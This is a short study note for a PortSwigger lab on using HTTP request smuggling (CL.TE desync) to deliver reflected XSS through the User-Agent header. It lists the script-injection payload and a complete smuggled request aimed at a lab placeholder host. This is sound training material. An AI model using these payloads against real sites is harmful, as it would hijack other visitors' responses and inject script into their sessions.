# Lab: Exploiting HTTP request smuggling to deliver reflected XSS

**Official lab:** [https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

## Lab idea

The lab combines request smuggling with an application’s reflected cross-site scripting weakness. It practices understanding how a desynchronized request can influence a later user’s response and amplify an existing injection issue.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Visit a blog post, and send the request to Burp Repeater.
2. Observe that the comment form contains your User-Agent header in a hidden input.
3. Inject an XSS payload into the User-Agent header and observe that it gets reflected: "/><script>alert(1)</script>
4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type…

## Payloads / key values
- `User-Agent`
- `"/><script>alert(1)</script>`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1`

## Official source
- [PortSwigger Academy: Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
